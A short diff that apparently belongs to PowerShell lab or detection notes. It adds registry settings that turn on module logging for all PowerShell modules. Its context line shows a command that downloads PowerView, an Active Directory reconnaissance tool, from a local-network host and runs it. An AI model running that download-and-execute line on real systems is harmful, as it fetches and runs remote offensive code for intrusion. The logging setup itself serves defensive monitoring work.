@@ -63,6 +63,15 @@ IEX (New-Object Net.WebClient).DownloadString('http://10.0.2.20:80/PowerView.ps1
 
 
 
+Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 1
+
+ 
+New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames" -Force
+
+ 
+Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames" -Name "*" -Value "*"
+
+ 
 
 
 
